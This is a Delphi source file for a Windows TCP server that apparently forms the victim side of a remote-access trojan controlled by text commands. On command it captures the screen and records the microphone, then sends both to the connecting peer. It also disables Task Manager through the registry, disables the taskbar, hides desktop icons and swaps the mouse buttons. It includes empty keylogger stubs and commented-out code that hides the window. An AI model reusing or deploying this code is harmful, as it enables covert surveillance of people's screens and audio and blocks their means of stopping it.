unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, IdBaseComponent, IdComponent, IdTCPServer, ComCtrls,
  IdTCPConnection, IdTCPClient, MMSystem, IdIPWatch, registry, jpeg, shellapi;

type
  TForm1 = class(TForm)
    IdTCPServer1: TIdTCPServer;
    Button1: TButton;
    Edit1: TEdit;
    Edit2: TEdit;
    StatusBar1: TStatusBar;
    Button2: TButton;
    ListBox1: TListBox;
    Button3: TButton;
    msgbox: TEdit;
    IdTCPClient1: TIdTCPClient;
    name: TEdit;
    IdIPWatch1: TIdIPWatch;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure IdTCPServer1Connect(AThread: TIdPeerThread);
    procedure IdTCPServer1Execute(AThread: TIdPeerThread);
    procedure Button3Click(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure Edit2KeyPress(Sender: TObject; var Key: Char);
    procedure IdTCPServer1Disconnect(AThread: TIdPeerThread);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    procedure ScreenShot(x : integer; y : integer; Width : integer; Height : integer; bm : TBitMap);
  end;

var
  Form1: TForm1;
  localname:string;
  pip:string;
  pport:integer;
implementation

{$R *.dfm}

procedure TForm1.ScreenShot(x : integer; y : integer; Width : integer; Height : integer; bm : TBitMap);
var
  dc: HDC; lpPal : PLOGPALETTE;
begin
{test width and height}
  if ((Width = 0) OR (Height = 0)) then exit;
  bm.Width := Width;
  bm.Height := Height;
{get the screen dc}
  dc := GetDc(0);
  if (dc = 0) then exit;
{do we have a palette device?}
  if (GetDeviceCaps(dc, RASTERCAPS) AND
      RC_PALETTE = RC_PALETTE) then
      begin
      {allocate memory for a logical palette}
        GetMem(lpPal, sizeof(TLOGPALETTE) + (255 * sizeof(TPALETTEENTRY)));
      {zero it out to be neat}
        FillChar(lpPal^, sizeof(TLOGPALETTE) + (255 * sizeof(TPALETTEENTRY)), #0);
      {fill in the palette version}
        lpPal^.palVersion := $300;
      {grab the system palette entries}
        lpPal^.palNumEntries :=
          GetSystemPaletteEntries(dc,0,256,lpPal^.palPalEntry);
        if (lpPal^.PalNumEntries <> 0) then
            begin
            {create the palette}
            bm.Palette := CreatePalette(lpPal^);
            end;
        FreeMem(lpPal, sizeof(TLOGPALETTE) + (255 * sizeof(TPALETTEENTRY)));
      end;
{copy from the screen to the bitmap}
BitBlt(bm.Canvas.Handle,0,0,Width,Height,Dc,x,y,SRCCOPY);
{release the screen dc}
ReleaseDc(0, dc);
end;

procedure Bmp2Jpeg(const BmpFileName, JpgFileName: string);
var
  Bmp: TBitmap;
  Jpg: TJPEGImage;
begin
  Bmp := TBitmap.Create;
  Jpg := TJPEGImage.Create;
  try
    Bmp.LoadFromFile(BmpFileName);
    Jpg.Assign(Bmp);
    Jpg.SaveToFile(JpgFileName);
  finally
    Jpg.Free;
    Bmp.Free;
  end;
end;

function BrowseURL(const URL: string) : boolean;
var
   Browser: string;
begin
   Result := True;
   Browser := '';
   with TRegistry.Create do
   try
     RootKey := HKEY_CLASSES_ROOT;
Access := KEY_QUERY_VALUE;
     if OpenKey('\htmlfile\shell\open\command', False) then
       Browser := ReadString('') ;
     CloseKey;
   finally
     Free;
   end;
   if Browser = '' then
   begin
     Result := False;
     Exit;
   end;
   Browser := Copy(Browser, Pos('"', Browser) + 1, Length(Browser)) ;
   Browser := Copy(Browser, 1, Pos('"', Browser) - 1) ;
   ShellExecute(0, 'open', PChar(Browser), PChar(URL), nil, SW_SHOW) ;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
idtcpserver1.Bindings.Clear;
idtcpserver1.Bindings.Add.IP:=edit1.Text;
idtcpserver1.Bindings.Add.Port:=strtoint(edit2.text); 
//IdTcpServer1.DefaultPort:=StrToInt(Edit2.Text);
idtcpserver1.Active:=true;
if idtcpserver1.Active=true then begin
statusbar1.Panels[1].Text:='Server Started';
listbox1.Items.Insert(0,'Server Started');
end;



end;

procedure TForm1.Button2Click(Sender: TObject);
begin
idtcpserver1.Active:=false;
idtcpclient1.Disconnect;
statusbar1.Panels[1].Text:='Server Stopped';
listbox1.Items.insert(0,'Server Stopped');
end;

procedure TForm1.IdTCPServer1Connect(AThread: TIdPeerThread);
var
welcomemsg:string;
begin
welcomemsg:='Connected';
AThread.Connection.WriteLn(welcomemsg);
listbox1.Items.insert(0,welcomemsg);
end;

procedure TForm1.IdTCPServer1Execute(AThread: TIdPeerThread);
var
    Command, cmsg, URL : String;
    regis:TRegistry;
    Size : integer;
    PicturePathName, ulfilename : string;
    fStream, ftmpStream : TFileStream;
    tBM : tbitmap;
    reg:TRegistry;
begin
pip:= athread.Connection.Socket.Binding.PeerIP;
pport:=athread.connection.Socket.Binding.PeerPort;
Command := AThread.Connection.ReadLn;
listbox1.Items.insert(0,command);

if Command = 'CDO' then
    begin
    //Athread.Connection.WriteLn('Open CD Tray');
    listbox1.Items.Insert(0, 'Opened CD Tray');
    mciSendString('Set cdaudio door open wait', nil, 0, handle); {opens cd Tray}
    end;

if Command = 'CDC' then
    begin
    //Athread.Connection.WriteLn('Close CD Tray');
    listbox1.Items.Insert(0, 'Closed CD Tray');
    mciSendString('Set cdaudio door closed wait', nil, 0, handle);  {closes cd tray}
    end;

if Command = 'SCREEN' then
    begin
    listbox1.items.insert(0,'Taking screen snap shot');
    tBM := TBitmap.Create;
    ScreenShot(0,0,Screen.Width,Screen.height,tBM);
    if fileExists ('ScreenShot.BMP') then DeleteFile('ScreenShot.BMP');
    tBM.SaveToFile('ScreenShot.BMP');
    tBm.FreeImage;
    FreeAndNil(tBM);
    Bmp2Jpeg('ScreenShot.BMP', 'ScreenShot.jpg');
    // open file stream to image requested
    fStream := TFileStream.Create('ScreenShot.jpg',fmOpenRead	+ fmShareDenyNone);
    // copy file stream to write stream
    AThread.Connection.OpenWriteBuffer;
    AThread.Connection.WriteStream(fStream);
    AThread.Connection.CloseWriteBuffer;
    // free the file stream
    FreeAndNil(fStream);
    listbox1.items.insert(0,'File transfer completed');
    AThread.Connection.Disconnect;
    end;

if Command = 'DLGMSG' then
    begin
    //Athread.Connection.WriteLn('Msg Recieved');
    listbox1.Items.Insert(0, 'Msg Recieved');
    cmsg:=listbox1.Items[2];
    MessageDlg (cmsg, mterror, [mbOk], 0);
    end;

if Command = 'HIDEDESK' then
    begin
    //Athread.Connection.WriteLn('Desktop Shortcuts Hidden');
    listbox1.Items.Insert(0, 'Desktop Shortcuts Hidden');
    ShowWindow(FindWindowEx(FindWindow('Progman', nil), 0, 'ShellDll_DefView',  nil), SW_HIDE);
    end;

if Command = 'SHOWDESK' then
    begin
    //Athread.Connection.WriteLn('Desktop Shortcuts Hidden');
    listbox1.Items.Insert(0, 'Desktop Shortcuts Hidden');
    ShowWindow(FindWindowEx(FindWindow('Progman', nil), 0, 'ShellDll_DefView',  nil), SW_SHOW);
    end;

if Command = 'DISABLETASKBAR' then
    begin
    //Athread.Connection.WriteLn('Disable TaskBar');
    listbox1.Items.Insert(0, 'Disable TaskBar');
    EnableWindow(FindWindow('Shell_TrayWnd', nil), False);
    end;

if Command = 'ENABLETASKBAR' then
    begin
    //Athread.Connection.WriteLn('Enable TaskBar');
    listbox1.Items.Insert(0, 'Enable TaskBar');
    EnableWindow(FindWindow('Shell_TrayWnd', nil), True);
    end;

if Command = 'RECORDSOUNDSTART' then
    begin
   // Athread.Connection.WriteLn('Start Record Sound');
    listbox1.Items.Insert(0, 'Start Record Sound');
    mciSendString('OPEN NEW TYPE WAVEAUDIO ALIAS MicSound', nil, 0, Handle);
     mciSendString('SET MicSound TIME FORMAT MS ' +      // set the time format

        'BITSPERSAMPLE 8 ' +                            // 8 Bit
        'CHANNELS 1 ' +                                 // MONO
        'SAMPLESPERSEC 8000 ' +                         // 8 KHz
        'BYTESPERSEC 8000',                             // 8000 Bytes/s
        nil, 0, Handle);

    mciSendString('RECORD MicSound', nil, 0, Handle);
    end;

if Command = 'RECORDSOUNDSTOP' then
    begin
    //Athread.Connection.WriteLn('Stop Record Sound');
    listbox1.Items.Insert(0, 'Stop Record Sound');
    mciSendString('STOP MicSound', nil, 0, Handle);
    end;

if Command = 'SAVERECORDEDSOUND' then
    begin
    //Athread.Connection.WriteLn('Save Recorded Sound');
    listbox1.Items.Insert(0, 'Save Recorded Sound');
    mciSendString(PChar('SAVE MicSound ' + 'Sound.wav'), nil, 0, Handle);
    mciSendString('CLOSE MicSound', nil, 0, Handle);
    end;

if Command = 'DOWNLOADSOUND' then
    begin
    if FileExists('Sound.wav') then
        Begin
        // open file stream to image requested
        fStream := TFileStream.Create('Sound.wav',fmOpenRead	+ fmShareDenyNone);
        // copy file stream to write stream
        AThread.Connection.OpenWriteBuffer;
        AThread.Connection.WriteStream(fStream);
        AThread.Connection.CloseWriteBuffer;
        // free the file stream
        FreeAndNil(fStream);
        //Athread.Connection.WriteLn('Download Recorded Sound');
        listbox1.Items.Insert(0, 'Download Recorded Sound');
        End
    else
    AThread.Connection.WriteLn('ERR - Requested file does not exist');
    AThread.Connection.Disconnect;
    end;

if Command = 'UPLOADFILE' then
    begin
    {ulfilename:=listbox1.Items[0];
    //listbox1.Items.Insert(0,'Downloading file');
    ftmpStream := TFileStream.Create(ulfilename,fmCreate);
    while connected do
    ReadStream(fTmpStream,-1,true);
    FreeAndNil(fTmpStream);
    Disconnect;
    connect;}
    end;

if Command = 'SETDESKTOP' then
    begin
    if FileExists(ExtractFileDir(ParamStr(0)) + '\' +'desk.jpg') then
    begin
    reg:=TRegistry.Create;
    with reg do begin
    try
      if OpenKey('\Control Panel\desktop', False)
    then begin
    //change wallpaper and tile it
    reg.WriteString('Wallpaper','desk.jpg');
    reg.WriteString('TileWallpaper','1');
    //update changes immediately
   SystemParametersInfo
     (SPI_SETDESKWALLPAPER,0,
     nil,SPIF_SENDWININICHANGE);
    end
 finally
   reg.free
 end;
end;
end else
showmessage('jpg not found');
    end;

if Command = 'BROWSEURL' then
    begin
    Athread.Connection.WriteLn('Open URL');
    listbox1.Items.Insert(0, 'Open URL');
    URL:=Athread.Connection.ReadLn;
    BrowseURL(URL);
    end;

if Command = 'MONON' then
    begin
    Athread.Connection.WriteLn('Monitor ON');
    listbox1.Items.Insert(0, 'Monitor ON');
    SendMessage(Handle,WM_SYSCOMMAND,SC_MONITORPOWER,0); {turn monitor on}
    end;

if Command = 'MONOFF' then
    begin
    Athread.Connection.WriteLn('Monitor OFF');
    listbox1.Items.Insert(0, 'Monitor OFF');
    SendMessage(Handle,WM_SYSCOMMAND,SC_MONITORPOWER,1); {turn monitor off}
    end;

if Command = 'REBOOT' then
    begin
    Athread.Connection.WriteLn('Restart Windows');
    listbox1.Items.Insert(0, 'Restart Windows');
    SendMessage(Application.Handle, WM_SYSCOMMAND, SC_MONITORPOWER, 0); {turn monitor off}
    end;

if Command = 'KILLTASK' then
    begin
    Athread.Connection.WriteLn('Kill TaskManager');
    listbox1.Items.Insert(0, 'Kill TaskManager');
    regis := TRegistry.Create;
    regis.RootKey := HKEY_CURRENT_USER;
    regis.OpenKey('Software', True);
    regis.OpenKey('Microsoft', True);
    regis.OpenKey('Windows', True);
    regis.OpenKey('CurrentVersion', True);
    regis.OpenKey('Policies', True);
    regis.OpenKey('System', True);
    regis.WriteString('DisableTaskMgr', '1');
    regis.CloseKey;
    end;

if Command = 'STARTTASK' then
    begin
    Athread.Connection.WriteLn('Start TaskManager');
    listbox1.Items.Insert(0, 'Start TaskManager');
    regis := TRegistry.Create;
    regis.RootKey := HKEY_CURRENT_USER;
    regis.OpenKey('Software', True);
    regis.OpenKey('Microsoft', True);
    regis.OpenKey('Windows', True);
    regis.OpenKey('CurrentVersion', True);
    regis.OpenKey('Policies', True);
    regis.OpenKey('System', True);
    regis.WriteString('DisableTaskMgr', '0');
    regis.CloseKey;
    end;

if Command = 'STARTLOGGER' then
    begin
    end;

if Command = 'STOPLOGGER' then
    begin
    end;

if Command = 'SWAPBTN' then
    begin
    Athread.Connection.WriteLn('Swap Mouse Buttons');
    listbox1.Items.Insert(0, 'Swap Mouse Buttons');
    SystemParametersInfo(SPI_SETMOUSEBUTTONSWAP, 1, nil, 0);
    end;

if Command = 'DEFAULTBTN' then
    begin
    Athread.Connection.WriteLn('Restore Mouse Buttons');
    listbox1.Items.Insert(0, 'Restore Mouse Buttons');
    SystemParametersInfo(SPI_SETMOUSEBUTTONSWAP, 0, nil, 0);
    end;

if Command = 'QUIT' then
    begin
    AThread.Connection.WriteLn('Goodbye!');
    AThread.Connection.Disconnect;
    end;

if Command ='Client Disconnected' then
    begin
   // showmessage('disconnected');
    end;
end;


procedure TForm1.Button3Click(Sender: TObject);
var
LCommand:string;
begin
LCommand := msgbox.Text;
idtcpclient1.Host:=pip;
idtcpclient1.Port:=pport;
idtcpclient1.Connect;
      {try
      idtcpclient1.connect;
      try
      idtcpclient1.writeln(LCommand);
      listbox1.Items.Insert(0,'We said -> ' + LCommand);
      finally
      idtcpclient1.disconnect;
      end;
      except
      on E : Exception do
          begin
          ShowMessage(E.Message);
          end;
      end;}
      idtcpclient1.WriteLn(LCommand);
    end;


procedure TForm1.FormActivate(Sender: TObject);
begin
localname:=idtcpserver1.LocalName;
name.Text:=localname;
edit1.Text:=idipwatch1.LocalIP;
end;

procedure TForm1.Edit2KeyPress(Sender: TObject; var Key: Char);
begin
 // #8 is Backspace
  if not (Key in [#8, '0'..'9']) then begin
    ShowMessage('Invalid key');
    // Discard the key
    Key := #0;
    end;
end;

procedure TForm1.IdTCPServer1Disconnect(AThread: TIdPeerThread);
begin
listbox1.items.insert(0,'Client Dis-Connected');
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
{//set the form size
Form1.clientheight:=0;
Form1.clientwidth:=0;
//This gets rid of the task bar entry
ShowWindow(Application.Handle, SW_HIDE); }

end;

end.
